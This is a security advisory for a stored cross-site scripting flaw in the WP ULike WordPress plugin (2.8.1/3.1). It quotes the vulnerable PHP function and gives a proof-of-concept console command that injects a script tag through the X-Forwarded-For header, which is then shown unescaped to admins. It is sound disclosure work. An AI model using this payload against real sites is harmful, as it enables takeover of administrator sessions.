@@ -1,0 +1,74 @@
+id: 30350
+date: 05/15/2018
+title: WordPress WP ULike 2.8.1 / 3.1 Cross Site Scripting Vulnerability
+author: Tom Adams
+cves: 
+
+Details
+================
+Software: WP ULike
+Version: 2.8.1,3.1
+Homepage: https://wordpress.org/plugins/wp-ulike/
+Advisory report: https://advisories.dxw.com/advisories/stored-xss-wp-ulike/
+CVE: Awaiting assignment
+CVSS: 6.4 (Medium; AV:N/AC:L/Au:N/C:P/I:P/A:N)
+
+Description
+================
+Stored XSS in WP ULike allows unauthorised users to do almost anything an admin can
+
+Vulnerability
+================
+The pluginas default configuration (after pressing aSave Changesa on the settings page) allows unauthenticated users to alikea posts. It fetches the useras IP like this:
+        function wp_ulike_get_real_ip() {
+                if (getenv(\'HTTP_CLIENT_IP\')) {
+                        $ip = getenv(\'HTTP_CLIENT_IP\');
+                } elseif (getenv(\'HTTP_X_FORWARDED_FOR\')) {
+                        $ip = getenv(\'HTTP_X_FORWARDED_FOR\');
+                } elseif (getenv(\'HTTP_X_FORWARDED\')) {
+                        $ip = getenv(\'HTTP_X_FORWARDED\');
+                } elseif (getenv(\'HTTP_FORWARDED_FOR\')) {
+                        $ip = getenv(\'HTTP_FORWARDED_FOR\');
+                } elseif (getenv(\'HTTP_FORWARDED\')) {
+                        $ip = getenv(\'HTTP_FORWARDED\');
+                } else {
+                        $ip = $_SERVER[\'REMOTE_ADDR\'];
+                }
+
+                return $ip;
+        }
+This will be incorrect in many situations. The header (which could be an IP address, or it could be an arbitrary string provided by the user) is stored in the database. Then itas displayed to the admin without being escaped.
+
+Proof of concept
+================
+
+Enable the plugin
+Visit /wp-admin/admin.php?page=wp-ulike-settings and press Save Settings
+Sign out
+Visit a post displaying a like button
+Open the console
+Paste and execute this: var d=document.querySelector(\'.wpulike-default a\').dataset;jQuery.ajax(\'/wp-admin/admin-ajax.php\', {method: \'POST\', headers: {\'X-Forwarded-For\': \'<script>alert(1)</script>\'},data: {action: \'wp_ulike_process\', id: d.ulikeId, status: d.ulikeStatus, type: d.ulikeType, nonce: d.ulikeNonce}})
+Sign in
+Visit /wp-admin/admin.php?page=wp-ulike-post-logs
+
+
+Mitigations
+================
+Upgrade to version 3.2 or later.
+
+Disclosure policy
+================
+dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/
+
+Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.
+
+This vulnerability will be published if we do not receive a response to this report with 14 days.
+
+Timeline
+================
+
+2017-10-18: Discovered
+2018-04-16: Reported to plugin author via contact form
+2018-04-23: Vendor reported fixed in 3.2 (first reply)
+
+#  0day.today [2023-03-26]  #
